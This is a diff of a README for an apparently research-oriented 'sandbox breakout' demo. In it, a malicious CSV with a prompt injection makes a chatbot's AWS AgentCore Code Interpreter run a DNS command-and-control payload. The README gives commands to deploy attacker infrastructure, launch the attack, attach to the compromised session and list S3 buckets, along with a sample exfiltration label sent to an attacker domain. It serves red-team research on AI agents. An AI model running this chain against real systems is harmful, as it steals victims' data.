@@ -67,48 +67,120 @@ Large outputs split into multiple chunks (60 chars max per label):
   Chunk 22: 1.22.22.1256.dGVzLXVzLWVhc3QtMS00NDU1NzA5MjEyOTg-.1.sess_abc123.c2.bt-research-control.com
 ```
 
-## Quick Start Guide
+## Project Structure
+
+This repository now contains two separate infrastructures to demonstrate a realistic attack scenario:
+
+```
+agentcore-sandbox-breakout/
+├── attacker-infra/          # Attacker's AWS account
+│   ├── terraform/           # C2 server infrastructure (EC2, Route53, DNS)
+│   ├── src/                 # Attack tools and C2 client
+│   │   ├── attacker_shell.py    # Operator interface
+│   │   ├── attack_client.py     # HTTP client for prompt injection
+│   │   ├── csv_payload_generator.py  # Malicious CSV generator
+│   │   └── payload_client.py    # Payload for Code Interpreter
+│   └── Makefile
+│
+├── victim-infra/            # Victim's AWS account
+│   ├── terraform/           # Chatbot infrastructure (ECS, ALB, AgentCore)
+│   ├── chatbot/             # Vulnerable FastAPI application
+│   └── Makefile
+│
+├── docs/                    # Technical specifications
+└── Makefile                 # Root Makefile for orchestration
+```
+
+## Realistic Attack Demo (No Credentials Required)
+
+The enhanced demo shows that an attacker with **NO AWS credentials** to the victim's account can exfiltrate sensitive data. The attack flow:
+
+1. **Attacker** deploys C2 server infrastructure
+2. **Victim** has a publicly-accessible AI chatbot (uses AgentCore Code Interpreter)
+3. **Attacker** sends malicious CSV with prompt injection to victim's public API
+4. **Chatbot** passes CSV to Code Interpreter for analysis
+5. **Prompt injection** triggers DNS C2 payload execution
+6. **Data exfiltrates** via DNS to attacker's C2 server
+
+### Quick Start (Realistic Demo)
+
+```bash
+# Terminal 1: Deploy attacker infrastructure
+cd attacker-infra
+make terraform-yolo
+source set_env_vars.sh
+
+# Terminal 2: Deploy victim infrastructure (separate AWS account recommended)
+cd victim-infra
+make deploy
+
+# Terminal 1: Launch attack (note the session ID in output)
+make attack TARGET=$(cd ../victim-infra/terraform && terraform output -raw chatbot_url)
+
+# Terminal 1: Attach to compromised session (use session ID from attack output)
+make attach SESSION=sess_abc123
+# In operator shell:
+# > whoami
+# > aws s3 ls
+# > aws dynamodb list-tables
+```
+
+---
+
+## Attacker Infrastructure Setup
 
 ### Prerequisites
 
 - AWS CLI configured
 - Python 3.12
-- Terraform installed with the latest provider ()
+- Terraform installed with the latest provider
 
-### Step 1: Deploy Infrastructure
+### Step 1: Deploy C2 Infrastructure
 
-First, you will need to edit the `terraform/terraform.tfvars` file to set your domain name and AWS region. Set the following environment variables with your own domain and append them to `terraform/terraform.tfvars`:
+First, edit the `attacker-infra/terraform/terraform.tfvars` file to set your domain name and AWS region:
 
 ```bash
 export DOMAIN_NAME="bt-research-control.com"
 export REGION="us-east-1"
 export BUCKET_NAME="agentcore-hacking"
-cat << EOF >> terraform/terraform.tfvars
+cat << EOF >> attacker-infra/terraform/terraform.tfvars
 domain_name = "${DOMAIN_NAME}"
 aws_region = "${REGION}"
-# This creates two buckets - one with the name, and one suffixed with -sensitive-data
 s3_bucket_name = "${BUCKET_NAME}"
 EOF
 ```
 
-Run the following commands to deploy the infrastructure and configure the EC2 instance.
+Deploy the C2 server infrastructure:
 
 ```bash
-# 1. Deploy infrastructure
+cd attacker-infra
+
+# Deploy infrastructure
 make terraform-yolo
 source set_env_vars.sh
-make configure-ec2
 ```
 
-### Step 2: Start the Interactive Shell
+### Step 2: Generate and Send Malicious Payload
 
-To run the interactive shell, you can use the following commands:
+Generate a malicious CSV with embedded payload:
 
 ```bash
-make operator
+make generate-csv
 ```
 
-### Step 3: Verify DNS Exfiltration
+Then either:
+- **Automated**: `make attack TARGET=https://victim-chatbot.com`
+- **Manual**: Upload the generated CSV to the victim chatbot web UI
+
+### Step 3: Attach to Session
+
+Use the session ID from the payload generation step:
+
+```bash
+make attach SESSION=sess_abc123
+```
+
+### Step 4: Verify DNS Exfiltration
 
 Now that you are in the interactive shell, you can verify that DNS exfiltration is working by executing these example commands.
 
